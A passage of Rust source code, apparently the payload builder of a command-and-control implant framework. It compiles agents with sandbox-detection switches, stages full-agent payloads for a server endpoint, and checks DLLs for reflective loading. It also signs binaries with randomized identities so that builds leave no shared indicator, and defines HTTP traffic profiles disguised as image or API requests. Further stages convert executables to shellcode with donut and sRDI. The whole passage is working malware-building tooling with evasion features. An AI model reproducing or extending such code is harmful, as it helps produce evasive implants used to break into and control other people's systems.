            &cli, &project_root, &cargo_bin, target, &target_dir,
            &build_env_json, &rustflags, &z_args, &dist_dir, &build_id,
            is_nightly, &toolchain_channel,
        )?;
    }

    // All link steps are done (primary compile and any staged-payload
    // compile, which shares the same RUSTFLAGS referencing the icon
    // object) - the resource object dir is no longer needed.
    if let Some((_obj, dir)) = &icon_build {
        let _ = fs::remove_dir_all(dir);
    }

    Ok(())
}

/// Assemble the cargo Command for an AGENT compile. The primary agent
/// compile and the stager's staged-payload compile both go through this so
/// the invocation can never diverge: same cargo -Z flags (trim-paths,
/// build-std), same RUSTFLAGS (incl. -Cpanic=immediate-abort), same config
/// blob, quiet feature, VM opt-out, toolchain pin and home propagation.
#[allow(clippy::too_many_arguments)]
fn agent_compile_command(
    cargo_bin: &Path,
    project_root: &Path,
    target: &str,
    target_dir: &Path,
    build_env_json: &str,
    rustflags: &str,
    z_args: &[String],
    bin_name: &str,
    cli: &Cli,
    is_nightly: bool,
    toolchain_channel: &str,
) -> Command {
    let mut cmd = Command::new(cargo_bin);
    // client_dll lives in its own workspace member crate (cdylib - cargo
    // rejects crate-type on [[bin]] targets), so it builds via -p while
    // every other agent artifact builds via --bin.
    if bin_name == "client_dll" {
        cmd.args(["build", "--release", "--target", target, "-p", "client_dll"]);
    } else {
        cmd.args(["build", "--release", "--target", target, "--bin", bin_name]);
    }
    cmd.arg("--target-dir")
       .arg(target_dir)
       .current_dir(project_root)
       .env("C2_BUILD_CONFIG", build_env_json)
       .env("RUSTFLAGS", rustflags);
    for z in z_args {
        cmd.arg(z);
    }
    // Bake the --allow-vm opt-out into the agent: detection.rs reads
    // RCM_AGENT_ALLOW_VM via option_env! at agent compile time and skips
    // the VM/sandbox check when it is set.
    if cli.allow_vm {
        cmd.env("RCM_AGENT_ALLOW_VM", "1");
    }
    // agent-quiet is an rcm feature: namespaced as rcm/agent-quiet when the
    // client_dll member crate is the build target.
    if !cli.debug {
        if bin_name == "client_dll" {
            cmd.args(["--features", "rcm/agent-quiet"]);
        } else {
            cmd.args(["--features", "agent-quiet"]);
        }
    }
    // Propagate CARGO_HOME / RUSTUP_HOME (defaults match the Docker image).
    match std::env::var("CARGO_HOME") {
        Ok(ch) => cmd.env("CARGO_HOME", ch),
        Err(_) => cmd.env("CARGO_HOME", "/usr/local/cargo"),
    };
    match std::env::var("RUSTUP_HOME") {
        Ok(rh) => cmd.env("RUSTUP_HOME", rh),
        Err(_) => cmd.env("RUSTUP_HOME", "/usr/local/rustup"),
    };
    // The spawned cargo is a rustup SHIM: under RUSTUP_TOOLCHAIN=<stable>
    // (set by official rust:* images) it would resolve stable and reject the
    // nightly-only -Z flags (-Ztrim-paths, -Zbuild-std) even though detection
    // saw nightly. Pin the toolchain explicitly for the child: env removal
    // alone would fall back to implicit resolution (rust-toolchain.toml,
    // directory overrides, rustup default - often stable).
    if is_nightly {
        cmd.env("RUSTUP_TOOLCHAIN", toolchain_channel);
    }
    cmd
}

/// Build the full agent (client) for a stager build and place it at
/// dist/staged_<build_id>.payload for the server's /stage/<build_id>
/// endpoint. The staged agent is the plain platform executable (client
/// bin), compiled through agent_compile_command with the same flags, config
/// blob and toolchain pin as the primary agent compile.
#[allow(clippy::too_many_arguments)]
fn build_staged_agent(
    cli: &Cli,
    project_root: &Path,
    cargo_bin: &Path,
    target: &str,
    target_dir: &Path,
    build_env_json: &str,
    rustflags: &str,
    z_args: &[String],
    dist_dir: &Path,
    build_id: &str,
    is_nightly: bool,
    toolchain_channel: &str,
) -> Result<()> {
    println!("[*] Stager: building the full-agent payload to stage (client bin)...");
    let mut cmd = agent_compile_command(
        cargo_bin, project_root, target, target_dir,
        build_env_json, rustflags, z_args, "client", cli,
        is_nightly, toolchain_channel,
    );
    let status = cmd.status()
        .context("Failed to spawn cargo for the staged agent build")?;
    if !status.success() {
        anyhow::bail!(
            "staged agent build failed (exit {:?}). The stager itself is built; \
             only the /stage/<id> payload is missing.",
            status.code()
        );
    }
    let cargo_ext = if target.contains("windows") { ".exe" } else { "" };
    let src = target_dir.join(target).join("release").join(format!("client{}", cargo_ext));
    if !src.exists() {
        anyhow::bail!(
            "Staged agent not found at {} after a successful build.",
            src.display()
        );
    }
    let payload = dist_dir.join(format!("staged_{}.payload", build_id));
    fs::copy(&src, &payload)?;
    println!("[+] Staged payload: {} (server: /stage/{})", payload.display(), build_id);
    Ok(())
}

/// Prove a freshly built client_dll is a genuine PE DLL whose export table
/// carries DllMain. Fails the build (clear error) instead of shipping an
/// inert artifact: reflective loaders (sRDI/donut) reach DllMain through
/// the PE entry point and rundll32 calls the export by name, so both a
/// missing DLL characteristic and a missing export are fatal.
fn verify_client_dll(dll_path: &Path) -> Result<()> {
    let bytes = fs::read(dll_path)
        .with_context(|| format!("Failed to read built client_dll artifact {}", dll_path.display()))?;
    rcm::shellcode::validate_x64_dll(&bytes)
        .map_err(|e| anyhow::anyhow!(
            "client_dll verification failed for {}: {e} \
             (the cdylib crate-type in client_dll/Cargo.toml should guarantee a real DLL)",
            dll_path.display()
        ))?;
    let exports = rcm::shellcode::pe_export_names(&bytes)
        .map_err(|e| anyhow::anyhow!(
            "client_dll verification failed: export table of {} is unreadable: {e}",
            dll_path.display()
        ))?;
    if !exports.iter().any(|n| n == "DllMain") {
        anyhow::bail!(
            "client_dll verification failed: DllMain is not exported from {} \
             (exports found: {}). rundll32 and reflective-loader flows would \
             receive an inert artifact - check the cdylib crate-type in \
             client_dll/Cargo.toml and the #[no_mangle] DllMain in \
             client_dll/src/lib.rs.",
            dll_path.display(),
            if exports.is_empty() { "<none>".to_string() } else { exports.join(", ") }
        );
    }
    println!("[+] client_dll verified: PE DLL, DllMain exported ({} export(s))", exports.len());
    Ok(())
}

/// Authenticode-sign a Windows PE with osslsigncode. Warns (never fails)
/// when signing is unavailable, so the build still produces a usable artifact.
/// Default PKCS#12 signing bundle, probed for the auto signing default.
const DEFAULT_SIGN_CERT: &str = "certs/rcm_sign.p12";

/// Effective signing decision. An explicit --no-sign always wins; explicit
/// --sign forces on; otherwise auto: ON when a signing cert is available
/// (--sign-cert set or the default bundle exists), OFF when no cert exists
/// (signing then would only produce a throwaway self-signed cert, which
/// buys no SmartScreen reputation).
fn signing_enabled(cli: &Cli, project_root: &Path) -> bool {
    if cli.no_sign {
        return false;
    }
    if cli.sign {
        return true;
    }
    cli.sign_cert.is_some() || project_root.join(DEFAULT_SIGN_CERT).is_file()
}

fn maybe_sign_pe(dest_path: &Path, cli: &Cli, project_root: &Path) -> Result<()> {
    if !signing_enabled(cli, project_root) {
        return Ok(());
    }
    if cli.platform != Platform::Windows {
        println!("[!] signing applies only to Windows PE targets; skipping.");
        return Ok(());
    }
    if !matches!(cli.format, Format::Exe | Format::Dll | Format::Service) {
        println!("[!] signing applies only to exe/dll/service formats; skipping.");
        return Ok(());
    }
    sign_pe_file(dest_path, cli, project_root)
}

/// Authenticode-sign `dest_path` in place (core of maybe_sign_pe, split out
/// so the `--format bin` pipeline `sign` stage can reuse it).
///
/// The throwaway key directory holds private key material (key.pem), so it
/// is registered the moment it exists and removed on EVERY exit path -
/// openssl/pkcs12/osslsigncode failures included.
fn sign_pe_file(dest_path: &Path, cli: &Cli, project_root: &Path) -> Result<()> {
    let mut tempdir: Option<PathBuf> = None;
    let result = sign_pe_file_inner(dest_path, cli, project_root, &mut tempdir);
    if let Some(dir) = tempdir {
        if let Err(e) = fs::remove_dir_all(&dir) {
            eprintln!("[!] failed to remove signing temp dir {}: {}", dir.display(), e);
        }
    }
    result
}

fn sign_pe_file_inner(dest_path: &Path, cli: &Cli, project_root: &Path, tempdir: &mut Option<PathBuf>) -> Result<()> {
    // Signing metadata: operator overrides (--sign-name/--sign-url/--sign-cn)
    // win; anything unset is randomized per call so signatures across builds
    // do not share a static IOC.
    let rand = rcm::build_validate::random_sign_identity();
    let pick = |v: &Option<String>, fallback: String| v.as_deref()
        .map(rcm::build_validate::sanitize_sign_field)
        .filter(|s| !s.is_empty())
        .unwrap_or(fallback);
    let sign_name = pick(&cli.sign_name, rand.name);
    let sign_url  = pick(&cli.sign_url, rand.url);
    let sign_cn   = pick(&cli.sign_cn, rand.cn);

    // Resolve or generate the PKCS#12 bundle: explicit --sign-cert wins,
    // then the default bundle (certs/rcm_sign.p12 - what the auto signing
    // default probes for), else a throwaway self-signed cert.
    let pfx_path = match &cli.sign_cert {
        Some(p) => PathBuf::from(p),
        None if project_root.join(DEFAULT_SIGN_CERT).is_file() => {
            let p = project_root.join(DEFAULT_SIGN_CERT);
            println!("[+] Signing with the default bundle {}", p.display());
            p
        }
        None => {
            let dir = std::env::temp_dir().join(format!("rcm-sign-{}", Uuid::new_v4()));
            fs::create_dir_all(&dir)?;
            // Register for cleanup immediately: from here on the directory
            // holds key.pem, and no failure path may leave it behind.
            *tempdir = Some(dir.clone());
            let pfx = dir.join("cert.pfx");
            let rc = Command::new("openssl")
                .args(["req", "-x509", "-newkey", "rsa:2048", "-nodes",
                       "-keyout"]).arg(dir.join("key.pem"))
                .arg("-out").arg(dir.join("cert.pem"))
                .args(["-days", "365", "-subj"])
                .arg(format!("/CN={}/O={}", sign_cn, sign_cn))
                .output()?;
            if !rc.status.success() {
                println!("[!] openssl keygen failed - skipping signing");
                return Ok(());
            }
            let rc = Command::new("openssl")
                .args(["pkcs12", "-export", "-out"]).arg(&pfx)
                .arg("-inkey").arg(dir.join("key.pem"))
                .arg("-in").arg(dir.join("cert.pem"))
                .arg("-passout").arg(format!("pass:{}", cli.sign_pass))
                .output()?;
            if !rc.status.success() {
                println!("[!] openssl pkcs12 export failed - skipping signing");
                return Ok(());
            }
            pfx
        }
    };

    let signed_path = dest_path.with_extension("signed.tmp");
    let mut cmd = Command::new("osslsigncode");
    cmd.args(["sign", "-pkcs12"]).arg(&pfx_path)
        .arg("-pass").arg(&cli.sign_pass)
        .arg("-n").arg(&sign_name)
        .arg("-i").arg(&sign_url)
        .arg("-in").arg(dest_path)
        .arg("-out").arg(&signed_path);
    if !cli.sign_ts.is_empty() {
        cmd.arg("-t").arg(&cli.sign_ts);
    }
    match cmd.output() {
        Ok(o) if o.status.success() && signed_path.exists() => {
            if let Err(e) = fs::rename(&signed_path, dest_path) {
                let _ = fs::remove_file(&signed_path);
                return Err(e).with_context(|| format!(
                    "failed to replace {} with the signed copy", dest_path.display()));
            }
            println!("[+] Signed: {} (Authenticode, \"{}\")", dest_path.display(), sign_name);
        }
        Ok(o) => {
            // osslsigncode creates the output file before failing; never
            // leave the partial artifact behind.
            if signed_path.exists() { let _ = fs::remove_file(&signed_path); }
            println!("[!] osslsigncode failed: {}", String::from_utf8_lossy(&o.stderr));
            println!("[!] Artifact left unsigned: {}", dest_path.display());
        }
        Err(_) => {
            if signed_path.exists() { let _ = fs::remove_file(&signed_path); }
            println!("[!] osslsigncode not found (apt-get install osslsigncode) - artifact left unsigned");
        }
    }
    Ok(())
}

/// Write a file containing private key material with owner-only
/// permissions (0600 on unix; best-effort elsewhere).
fn write_key_file(path: &Path, json: &str) -> Result<()> {
    use std::io::Write;
    let mut opts = fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    let mut f = opts.open(path)
        .with_context(|| format!("failed to open {}", path.display()))?;
    f.write_all(json.as_bytes())
        .with_context(|| format!("failed to write {}", path.display()))?;
    Ok(())
}

fn save_server_artifacts(project_root: &Path, build_id: &str, key: &SigningKey, profile: &MalleableProfile) -> Result<()> {
    let dist_dir = project_root.join("dist");
    fs::create_dir_all(&dist_dir)?;
    let key_b64 = BASE64.encode(key.to_bytes());
    let profile_json = serde_json::to_string(profile)?;
    let import_data = json!({
        "build_id": build_id,
        "private_key": key_b64,
        "profile_data": profile_json,
        "note": "Import this into the server database table 'build_keys'"
    });
    let json = serde_json::to_string_pretty(&import_data)?;
    // Per-build key file: a fixed server_keys.json was overwritten by every
    // build, destroying the private key of all but the newest one.
    let per_build = dist_dir.join(format!("server_keys_{}.json", build_id));
    write_key_file(&per_build, &json)?;
    // Compat copy for consumers that reference the fixed name
    // (start_docker.sh reset path, the manual-import workflow): it mirrors
    // the LATEST build's key file.
    write_key_file(&dist_dir.join("server_keys.json"), &json)?;
    println!("[+] Server keys: {}", per_build.display());
    Ok(())
}

fn try_update_local_db(project_root: &Path, build_id: &str, key: &SigningKey, profile: &MalleableProfile, challenge_key: &[u8; 32]) -> Result<()> {
    // Anchor the DB to the project root: opened CWD-relative, a builder run
    // from another directory would register keys into a stray c2_audit.db.
    let db_path = project_root.join("c2_audit.db");
    let conn = Connection::open(&db_path)?;

    conn.execute(
        "CREATE TABLE IF NOT EXISTS build_keys (
            build_id TEXT PRIMARY KEY,
            private_key BLOB,
            profile TEXT DEFAULT 'default',
            profile_data TEXT,
            challenge_key BLOB
        )",
        [],
    )?;

    let col_check = |name: &str| -> bool {
        conn.query_row(
            &format!("SELECT count(*) FROM pragma_table_info('build_keys') WHERE name='{}'", name),
            [], |r| r.get::<_, i32>(0)
        ).unwrap_or(0) > 0
    };
    if !col_check("profile_data") {
        let _ = conn.execute("ALTER TABLE build_keys ADD COLUMN profile_data TEXT", []);
    }
    if !col_check("challenge_key") {
        let _ = conn.execute("ALTER TABLE build_keys ADD COLUMN challenge_key BLOB", []);
    }

    let profile_json = serde_json::to_string(profile)?;
    conn.execute(
        "INSERT OR REPLACE INTO build_keys (build_id, private_key, profile, profile_data, challenge_key) VALUES (?1, ?2, ?3, ?4, ?5)",
        rusqlite::params![build_id, key.to_bytes(), profile.name, profile_json, &challenge_key[..]],
    )?;

    println!("[+] Automatically registered Build ID '{}' (Profile: {}) in local database.", build_id, profile.name);
    Ok(())
}

fn construct_builtin_profile(arg: &ProfileArg) -> MalleableProfile {
    match arg {
        ProfileArg::Default => MalleableProfile::default(),
        ProfileArg::HttpPost => {
            let mut headers = HashMap::new();
            headers.insert("Content-Type".into(), "application/octet-stream".into());
            headers.insert("Accept".into(), "*/*".into());
            MalleableProfile {
                name: "legacy_http_post".into(),
                user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Legacy/1.0".into(),
                format_http: true,
                http_get: HttpBlock {
                    uris: vec!["/api/v1/sync".into()],
                    headers: headers.clone(),
                    data_transform: vec![TransformStep::Base64],
                },
                http_post: HttpBlock {
                    uris: vec!["/api/v1/sync".into()],
                    headers,
                    data_transform: vec![TransformStep::Base64],
                }
            }
        },
        ProfileArg::HttpImage => {
            let mut headers = HashMap::new();
            headers.insert("Content-Type".into(), "image/gif".into());
            let gif_magic = "GIF89a".to_string();
            MalleableProfile {
                name: "legacy_http_image".into(),
                user_agent: "Mozilla/5.0 (Compatible; ImageFetcher/1.0)".into(),
                format_http: true,
                http_get: HttpBlock {
                    uris: vec!["/image.gif".into()],
                    headers: headers.clone(),
                    data_transform: vec![TransformStep::Append(gif_magic.clone())],
                },
                http_post: HttpBlock {
                    uris: vec!["/upload.gif".into()],
                    headers,
                    data_transform: vec![TransformStep::Prepend(gif_magic)],
                }
            }
        }
    }
}


// ═══════════════════════════════════════════════════════════════════════════
// New generation formats: donut / pe_to_shellcode / pic_c / bin pipeline
// ═══════════════════════════════════════════════════════════════════════════

/// Map --sc-output to (encoding, file extension). Shared by every format
/// that emits shellcode-style output (shellcode, donut, pe_to_shellcode,
/// pic_c).
fn sc_encoding(cli: &Cli) -> (rcm::shellcode::ShellcodeEncoding, &'static str) {
    match cli.sc_output {
        ScOutput::Bin => (rcm::shellcode::ShellcodeEncoding::Raw,    ".bin"),
        ScOutput::B64 => (rcm::shellcode::ShellcodeEncoding::Base64, ".b64.txt"),
        ScOutput::C   => (rcm::shellcode::ShellcodeEncoding::CArray, ".c.txt"),
        ScOutput::Hex => (rcm::shellcode::ShellcodeEncoding::Hex,    ".hex.txt"),
    }
}

/// Locate the donut generator binary. Checks (in order):
///   1. $DONUT_PATH
///   2. /opt/rcm/donut - baked into the rcm-server Docker image
///   3. <project_root>/tools/donut/donut - vendored build
///   4. `donut` in $PATH
fn find_donut(project_root: &Path) -> Option<PathBuf> {
    if let Ok(p) = std::env::var("DONUT_PATH") {
        let pb = PathBuf::from(&p);
        if pb.is_file() { return Some(pb); }
    }
    let known = [
        PathBuf::from("/opt/rcm/donut"),
        project_root.join("tools").join("donut").join("donut"),
    ];
    for p in &known {
        if p.is_file() { return Some(p.clone()); }
    }
    // PATH lookup (no direct API; probe with --help)
    if Command::new("donut").output().map(|o| o.status.success()).unwrap_or(false) {
        return Some(PathBuf::from("donut"));
    }
    None
}

/// Run donut on `input` (a PE file: EXE or DLL) and return the shellcode
/// bytes. Uses amd64-only output (-a 2) in binary form (-f 1); higher-level
/// encodings (b64/c/hex) are applied afterwards via the shared
/// rcm::shellcode::encode_shellcode path.
fn run_donut(donut: &Path, input: &Path) -> Result<Vec<u8>> {
    let dir = std::env::temp_dir().join(format!("rcm-donut-{}", Uuid::new_v4()));
    fs::create_dir_all(&dir)?;
    let out = dir.join("donut.bin");
    let res = Command::new(donut)
        .args(["-a", "2", "-f", "1", "-i"])
        .arg(input)
        .arg("-o")
        .arg(&out)
        .output();
    let bytes = match res {
        Ok(o) if o.status.success() && out.is_file() => Some(fs::read(&out)?),
        Ok(o) => {
            eprintln!("[-] donut failed:\n{}{}",
                String::from_utf8_lossy(&o.stdout),
                String::from_utf8_lossy(&o.stderr));
            None
        }
        Err(e) => {
            eprintln!("[-] failed to spawn donut at {}: {e}", donut.display());
            None
        }
    };
    let _ = fs::remove_dir_all(&dir);
    let bytes = bytes.ok_or_else(|| anyhow::anyhow!(
        "donut conversion failed for {}", input.display()))?;
    if bytes.len() < 64 {
        anyhow::bail!("donut produced a suspiciously small output ({} bytes)", bytes.len());
    }
    Ok(bytes)
}

/// Compile a C source file to position-independent x86_64 shellcode.
///
/// Recipe (proven against templates/pic_template.c and tools/pe_stub.c):
///   mingw-gcc -Os -fno-builtin -fno-ident -fno-asynchronous-unwind-tables
///             -fno-stack-protector -fomit-frame-pointer -nostdlib
///             -Wl,-e,go -Wl,--build-id=none <src> -o pic.exe
///   objcopy -O binary --only-section=.text pic.exe pic.bin
///
/// ENTRY CONVENTION: the entry symbol is `go` (no CRT, no args, returns via
/// `ret`). It must be the only out-of-line function so it lands at offset 0
/// of .text. See templates/pic_template.c for the full contract.
fn compile_pic(src: &Path) -> Result<Vec<u8>> {
    let gcc = "x86_64-w64-mingw32-gcc";
    let objcopy = "x86_64-w64-mingw32-objcopy";
    let dir = std::env::temp_dir().join(format!("rcm-pic-{}", Uuid::new_v4()));
    fs::create_dir_all(&dir)?;
    let exe = dir.join("pic.exe");
    let bin = dir.join("pic.bin");

    let c_out = Command::new(gcc)
        .args(["-Os", "-fno-builtin", "-fno-ident",
               "-fno-asynchronous-unwind-tables", "-fno-stack-protector",
               "-fomit-frame-pointer", "-nostdlib",
               "-Wl,-e,go", "-Wl,--build-id=none"])
        .arg(src)
        .arg("-o").arg(&exe)
        .output()
        .with_context(|| format!("failed to spawn {gcc} (is mingw-w64 installed?)"))?;
    if !c_out.status.success() {
        let _ = fs::remove_dir_all(&dir);
        anyhow::bail!(
            "PIC compile failed for {}:\n{}",
            src.display(),
            String::from_utf8_lossy(&c_out.stderr)
        );
    }

    // Verify the entry contract before extracting .text: objcopy emits the
    // section raw, so offset 0 of the shellcode is whatever function the
    // linker placed first. `go` MUST be that symbol - multi-function C with
    // helpers placed before `go` would otherwise yield shellcode whose
    // entry point is not `go`.
    if let Err(e) = verify_pic_entry(&exe) {
        let _ = fs::remove_dir_all(&dir);
        return Err(e);
    }

    let o_out = Command::new(objcopy)
        .args(["-O", "binary", "--only-section=.text"])
        .arg(&exe)
        .arg(&bin)
        .output()
        .with_context(|| format!("failed to spawn {objcopy}"))?;
    let bytes = if o_out.status.success() && bin.is_file() {
        Some(fs::read(&bin)?)
    } else {
        None
    };
    let _ = fs::remove_dir_all(&dir);
    let bytes = bytes.ok_or_else(|| anyhow::anyhow!(
        "objcopy failed: {}", String::from_utf8_lossy(&o_out.stderr)))?;
    if bytes.is_empty() {
        anyhow::bail!("objcopy produced an empty .text section for {}", src.display());
    }
    Ok(bytes)
}

/// Verify the pic_c entry contract on the linked PE: `go` must exist and
/// must be the lowest-address out-of-line text symbol, i.e. the function
/// the linker placed at the start of .text. Uses nm from the same mingw
/// toolchain the compile/objcopy steps already require.
fn verify_pic_entry(exe: &Path) -> Result<()> {
    let nm = "x86_64-w64-mingw32-nm";
    let out = Command::new(nm)
        .arg(exe)
        .output()
        .with_context(|| format!(
            "failed to spawn {nm} (needed to verify the PIC entry contract; \
             install binutils-mingw-w64)"))?;
    if !out.status.success() {
        anyhow::bail!(
            "{} failed on {}: {}",
            nm, exe.display(),
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    let stdout = String::from_utf8_lossy(&out.stdout);
    // nm lines look like "<hex addr> <type> <name>"; T/t are text symbols.
    let mut text_syms: Vec<(u64, &str)> = Vec::new();
    for line in stdout.lines() {
        let mut it = line.split_whitespace();
        let (Some(addr), Some(ty), Some(name)) = (it.next(), it.next(), it.next()) else {
            continue;
        };
        if ty != "T" && ty != "t" { continue; }
        if let Ok(a) = u64::from_str_radix(addr, 16) {
            text_syms.push((a, name));
        }
    }
    if !text_syms.iter().any(|(_, n)| *n == "go") {
        anyhow::bail!(
            "PIC entry symbol `go` not found in {}. \
             The C source must define `void go(void)` as the entry point \
             (see templates/pic_template.c).",
            exe.display()
        );
    }
    let min_addr = text_syms.iter().map(|(a, _)| *a).min().unwrap_or(u64::MAX);
    let first: Vec<&str> = text_syms.iter()
        .filter(|(a, _)| *a == min_addr)
        .map(|(_, n)| *n)
        .collect();
    if !first.contains(&"go") {
        anyhow::bail!(
            "PIC entry contract violated: `{}` sits at the start of .text, not `go`. \
             Make helper functions `static`/`inline` or place `go` first in the source; \
             see templates/pic_template.c for the contract.",
            first.join(", ")
        );
    }
    if text_syms.len() > 1 {
        println!("[!] PIC note: {} text symbols present; `go` verified at .text start.", text_syms.len());
    }
    Ok(())
}

/// Resolve the PIC C source: --pic-src if given, otherwise the bundled
/// template at <project_root>/templates/pic_template.c.
fn resolve_pic_src(cli: &Cli, project_root: &Path) -> Result<PathBuf> {
    let src = match &cli.pic_src {
        Some(p) => PathBuf::from(p),
        None => project_root.join("templates").join("pic_template.c"),
    };
    if !src.is_file() {
        anyhow::bail!(
            "PIC C source not found at {}.\n\
             Pass --pic-src <file.c> or keep templates/pic_template.c in the project.",
            src.display()
        );
    }
    Ok(src)
}

/// `--format pic_c`: compile operator C to PIC shellcode. Runs BEFORE any
/// agent config/crypto setup in main() - no Rust build is involved.
fn build_pic_c(cli: &Cli, project_root: &Path) -> Result<()> {
    let src = resolve_pic_src(cli, project_root)?;
    println!("[*] Format:       pic_c");
    println!("[*] PIC source:   {}", src.display());
    let bytes = compile_pic(&src)?;

    let id = Uuid::new_v4().to_string();
    let short_id: String = id.chars().take(8).collect();
    let name_base = cli.name.as_deref()
        .and_then(sanitize_artifact_name)
        .unwrap_or_else(|| format!("pic_{}", short_id));

    let dist_dir = project_root.join("dist");
    fs::create_dir_all(&dist_dir)?;
    let (encoding, sc_ext) = sc_encoding(cli);
    let rendered = rcm::shellcode::encode_shellcode(&bytes, encoding, "rcm_pic");
    let dest_path = dist_dir.join(format!("{}{}", name_base, sc_ext));
    fs::write(&dest_path, &rendered)?;

    println!("\n[+] Build Success!");
    // NOTE: the API job watcher harvests the artifact path from the
    // "[+] Binary: " prefix - keep this exact line first.
    println!("[+] Binary: {}", dest_path.display());
    println!("[+] Format:   pic_c ({:?} encoding)", cli.sc_output);
    println!("[+] PIC:      {} bytes (entry: `go` at offset 0 of .text)", bytes.len());
    Ok(())
}

/// Execute the transform stages of a pipeline (everything after the source
/// selector). `is_pe` tracks whether the current artifact is still a PE
/// (donut/srdi/pe_to_shellcode/sign require one).
fn run_pipeline_stages(
    cli: &Cli,
    project_root: &Path,
    artifact: Vec<u8>,
    mut is_pe: bool,
    stages: &[String],
) -> Result<Vec<u8>> {
    let mut cur = artifact;
    for st in stages {
        match st.as_str() {
            "donut" => {
                if !is_pe {
                    anyhow::bail!("pipeline stage 'donut' requires a PE artifact \
                                   (place it before any bin-producing stage)");
                }
                let donut = find_donut(project_root).ok_or_else(|| anyhow::anyhow!(
                    "donut generator not found (DONUT_PATH, /opt/rcm/donut, \
                     tools/donut/donut, or PATH)"))?;
                let tmp_dir = std::env::temp_dir().join(format!("rcm-pipe-{}", Uuid::new_v4()));
                fs::create_dir_all(&tmp_dir)?;
                let tmp_pe = tmp_dir.join("stage.pe");
                fs::write(&tmp_pe, &cur)?;
                let res = run_donut(&donut, &tmp_pe);
                let _ = fs::remove_dir_all(&tmp_dir);
                cur = res?;
                is_pe = false;
                println!("[+] stage donut: {} bytes", cur.len());
            }
            "srdi" => {
                if !is_pe {
                    anyhow::bail!("pipeline stage 'srdi' requires a PE artifact");
                }
                cur = rcm::shellcode::convert_dll_to_shellcode(
                    &cur, &rcm::shellcode::ShellcodeOptions::default())
                    .map_err(|e| anyhow::anyhow!("pipeline stage srdi failed: {e}"))?;
                is_pe = false;
                println!("[+] stage srdi: {} bytes", cur.len());
            }
            "pe_to_shellcode" => {
                if !is_pe {
                    anyhow::bail!("pipeline stage 'pe_to_shellcode' requires a PE artifact");
                }
                cur = rcm::shellcode::convert_pe_to_shellcode(
                    &cur, &rcm::shellcode::ShellcodeOptions::default())
                    .map_err(|e| anyhow::anyhow!("pipeline stage pe_to_shellcode failed: {e}"))?;
                is_pe = false;
                println!("[+] stage pe_to_shellcode: {} bytes", cur.len());
            }
            "sign" => {
                if !is_pe {
                    anyhow::bail!("pipeline stage 'sign' requires a PE artifact");
                }
                let tmp_dir = std::env::temp_dir().join(format!("rcm-pipe-{}", Uuid::new_v4()));
                fs::create_dir_all(&tmp_dir)?;
                let tmp_pe = tmp_dir.join("stage.exe");
                fs::write(&tmp_pe, &cur)?;
                sign_pe_file(&tmp_pe, cli, project_root)?;
                cur = fs::read(&tmp_pe)?;
                let _ = fs::remove_dir_all(&tmp_dir);
                println!("[+] stage sign: {} bytes", cur.len());
            }
            "b64" => {
                cur = rcm::shellcode::encode_base64(&cur).into_bytes();
                println!("[+] stage b64: {} bytes", cur.len());
            }
            other => anyhow::bail!(
                "pipeline stage '{other}' is not a transform stage \
                 (source stages pe/exe/dll/pic must be first)"
            ),
        }
    }
    Ok(cur)
}

/// `--format bin` with a pic source stage: compile the template/operator C
/// first, then run the remaining transform stages. No Rust agent build.
fn run_pic_pipeline(
    cli: &Cli,
    project_root: &Path,
    stages: &[String],
    short_id: &str,
) -> Result<()> {
    let src = resolve_pic_src(cli, project_root)?;
    println!("[*] Pipeline:     {}", stages.join(" -> "));
    println!("[*] PIC source:   {}", src.display());
    let pic = compile_pic(&src)?;
    println!("[+] stage pic: {} bytes", pic.len());
    let out = run_pipeline_stages(cli, project_root, pic, false, &stages[1..])?;

    let name_base = cli.name.as_deref()
        .and_then(sanitize_artifact_name)
        .unwrap_or_else(|| format!("pic_pipeline_{}", short_id));
    let dist_dir = project_root.join("dist");
    fs::create_dir_all(&dist_dir)?;
    let dest_path = dist_dir.join(format!("{}.bin", name_base));
    fs::write(&dest_path, &out)?;

    println!("\n[+] Build Success!");
    println!("[+] Binary: {}", dest_path.display());
    println!("[+] Format:   bin (pipeline: {})", stages.join(","));
    println!("[+] Output:   {} bytes", out.len());
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_channel_dated_nightly() {
        let toml = "[toolchain]\nchannel = \"nightly-2026-08-22\"\ncomponents = [\"rust-src\"]\n";
        assert_eq!(parse_toolchain_channel(toml).as_deref(), Some("nightly-2026-08-22"));
    }

    #[test]
    fn parse_channel_floating_and_single_quotes() {
        assert_eq!(parse_toolchain_channel("channel = \"nightly\"").as_deref(), Some("nightly"));
        assert_eq!(parse_toolchain_channel("channel = 'stable'").as_deref(), Some("stable"));
    }

    #[test]
    fn parse_channel_ignores_comments_and_junk() {
        let toml = "# channel = \"stable\"\n[toolchain]\n# note\nchannel = \"nightly-2026-08-22\" # pin\n";
        assert_eq!(parse_toolchain_channel(toml).as_deref(), Some("nightly-2026-08-22"));
        assert!(parse_toolchain_channel("[toolchain]\ncomponents = [\"rust-src\"]\n").is_none());
        assert!(parse_toolchain_channel("channel = \"\"").is_none());
    }

    #[test]
    fn resolve_channel_missing_file_falls_back_to_nightly() {
        // A directory without rust-toolchain.toml must fall back to the
        // floating "nightly" name.
        let dir = std::env::temp_dir().join(format!("rcm-tc-test-{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        assert_eq!(resolve_toolchain_channel(&dir), "nightly");
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_channel_reads_pinned_value() {
        let dir = std::env::temp_dir().join(format!("rcm-tc-test2-{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("rust-toolchain.toml"),
                  "[toolchain]\nchannel = \"nightly-2026-08-22\"\n").unwrap();
        assert_eq!(resolve_toolchain_channel(&dir), "nightly-2026-08-22");
        let _ = fs::remove_dir_all(&dir);
    }

    // ── valid_parents parse matrix ────────────────────────────────────

    #[test]
    fn valid_parents_empty_disables_check() {
        assert_eq!(parse_valid_parents("").unwrap(), Vec::<String>::new());
        assert_eq!(parse_valid_parents("   ").unwrap(), Vec::<String>::new());
    }

    #[test]
    fn valid_parents_accepts_exe_names() {
        assert_eq!(
            parse_valid_parents("explorer.exe,svchost.exe").unwrap(),
            vec!["explorer.exe".to_string(), "svchost.exe".to_string()]
        );
        // Whitespace around entries is trimmed.
        assert_eq!(
            parse_valid_parents(" explorer.exe , WINWORD.EXE ").unwrap(),
